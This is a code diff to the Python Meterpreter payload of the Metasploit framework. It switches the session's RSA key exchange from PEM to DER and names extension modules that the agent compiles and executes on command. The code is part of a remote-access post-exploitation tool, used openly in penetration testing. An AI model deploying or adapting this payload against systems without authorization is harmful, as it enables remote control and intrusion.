@@ -164,7 +164,7 @@ TLV_TYPE_MACHINE_ID            = TLV_META_TYPE_STRING  | 460
 TLV_TYPE_UUID                  = TLV_META_TYPE_RAW     | 461
 TLV_TYPE_SESSION_GUID          = TLV_META_TYPE_RAW     | 462
 
-TLV_TYPE_RSA_PUB_KEY           = TLV_META_TYPE_STRING  | 550
+TLV_TYPE_RSA_PUB_KEY           = TLV_META_TYPE_RAW     | 550
 TLV_TYPE_SYM_KEY_TYPE          = TLV_META_TYPE_UINT    | 551
 TLV_TYPE_SYM_KEY               = TLV_META_TYPE_RAW     | 552
 TLV_TYPE_ENC_SYM_KEY           = TLV_META_TYPE_RAW     | 553
@@ -1403,11 +1403,9 @@ class PythonMeterpreter(object):
         self.transport.aes_key = rand_bytes(32)
         self.transport.aes_enabled = False
         response += tlv_pack(TLV_TYPE_SYM_KEY_TYPE, ENC_AES256)
-        # TODO: adjust this when we've moved from PEM to DER
-        pem = packet_get_tlv(request, TLV_TYPE_RSA_PUB_KEY)['value'].strip()
-        debug_print('[*] PEM is: ' + pem)
-        der = base64.b64decode(bytes(''.join(pem.split("\n")[1:-1]), 'UTF-8'))
-        debug_print('[*] AES Key: ' + hex(met_rsa.b2i(self.transport.aes_key)))
+        der = packet_get_tlv(request, TLV_TYPE_RSA_PUB_KEY)['value'].strip()
+        debug_print('[*] RSA key: ' + str(binascii.b2a_hex(der)))
+        debug_print('[*] AES key: ' + hex(met_rsa.b2i(self.transport.aes_key)))
         enc_key = met_rsa_encrypt(der, self.transport.aes_key)
         debug_print('[*] Encrypted AES key: ' + hex(met_rsa.b2i(enc_key)))
         response += tlv_pack(TLV_TYPE_ENC_SYM_KEY, enc_key)
@@ -1419,11 +1417,16 @@ class PythonMeterpreter(object):
         if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
             return ERROR_FAILURE, response
 
+        libname = '???'
+        match = re.search(r'^meterpreter\.register_extension\(\'([a-zA-Z0-9]+)\'\)$', str(data_tlv['value']), re.MULTILINE)
+        if match is not None:
+            libname = match.group(1)
+
         self.last_registered_extension = None
         symbols_for_extensions = {'meterpreter':self}
         symbols_for_extensions.update(EXPORTED_SYMBOLS)
         i = code.InteractiveInterpreter(symbols_for_extensions)
-        i.runcode(compile(data_tlv['value'], '', 'exec'))
+        i.runcode(compile(data_tlv['value'], 'ext_server_' + libname + '.py', 'exec'))
         extension_name = self.last_registered_extension
 
         if extension_name:
